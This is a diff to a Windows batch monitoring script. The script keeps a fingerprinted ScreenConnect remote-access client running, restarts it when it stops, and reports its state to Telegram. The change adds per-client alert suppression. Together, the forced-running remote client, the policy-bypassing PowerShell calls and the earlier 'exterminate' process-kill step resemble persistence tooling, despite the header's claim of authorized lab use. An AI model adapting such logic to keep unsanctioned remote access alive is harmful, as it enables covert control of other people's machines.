@@ -1,7 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M31
-rem  O41: exterminate killed Gryxa (null-path proc); sync FP before kill; fix heal.
+rem  OWN_MON  BUILD 20260802M32
+rem  O44: per-Gryxa state+24h RESTORED suppress (stop TG flood); no state clobber.
 rem  Authorized internal deployment - lab/competition scope only.
 rem ═══════════════════════════════════════════════════════════════
 setlocal EnableDelayedExpansion
@@ -35,7 +35,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M31"
+set "MONVER=M32"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -361,11 +361,11 @@ if "%GRYXA_OK%"=="0" (
 
 if "%GRYXA_OK%"=="1" if "%GRYXA_WAS%"=="0" (
   powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "gryxa-restored" >nul 2>&1
-  call :TgState RESTORED "Gryxa ScreenConnect healthy (svc running)"
+  call :TgGryxa RESTORED "Gryxa ScreenConnect healthy (svc running)"
 )
 if "%GRYXA_OK%"=="0" (
   powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "gryxa-must-fail" >nul 2>&1
-  call :TgState DOWN "Gryxa MUST-RUN - service not Running after heal"
+  call :TgGryxa DOWN "Gryxa MUST-RUN - service not Running after heal"
 )
 
 rem ── [H] quiet digest (skip healthy hosts — was flooding Telegram) ──
@@ -418,6 +418,41 @@ if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gr
 sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
 if not errorlevel 1 set "GRYXA_OK=1"
 if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
+exit /b 0
+
+:TgGryxa
+rem %1=kind %2=msg — per-Gryxa state so it cannot reuse Primary own_mon.state.
+set "GSTATE=%~1"
+set "GMSG=%~2"
+set "GSTATEFILE=%WD%\own_mon_gryxa.state"
+set "GOLD="
+if exist "%GSTATEFILE%" set /p GOLD=<"%GSTATEFILE%"
+if /I "%GSTATE%"=="RESTORED" (
+  if /I "%GOLD%"=="RESTORED" exit /b 0
+  if exist "%WD%\tg_gryxa.flag" (
+    powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_gryxa.flag').LastWriteTime).TotalMinutes -lt 1440){exit 0}else{exit 1}" >nul 2>&1
+    if not errorlevel 1 (
+      echo tg_gryxa_suppress_%GSTATE%>>"%LOG%"
+      exit /b 0
+    )
+  )
+  echo %GSTATE%>"%GSTATEFILE%"
+  echo sent>"%WD%\tg_gryxa.flag"
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State %GSTATE% -Summary "%GMSG%" -Build %MONVER% -Count %COUNT% >nul 2>&1
+  echo tg gryxa %GSTATE% sent>>"%LOG%"
+  exit /b 0
+)
+if /I "%GSTATE%"=="DOWN" if /I "%GOLD%"=="DOWN" if exist "%WD%\tg_gryxa.flag" (
+  powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_gryxa.flag').LastWriteTime).TotalMinutes -lt 360){exit 0}else{exit 1}" >nul 2>&1
+  if not errorlevel 1 (
+    echo tg_gryxa_suppress_%GSTATE%>>"%LOG%"
+    exit /b 0
+  )
+)
+echo %GSTATE%>"%GSTATEFILE%"
+echo sent>"%WD%\tg_gryxa.flag"
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State %GSTATE% -Summary "%GMSG%" -Build %MONVER% -Count %COUNT% >nul 2>&1
+echo tg gryxa %GSTATE% sent>>"%LOG%"
 exit /b 0
 
 :InstallMsi
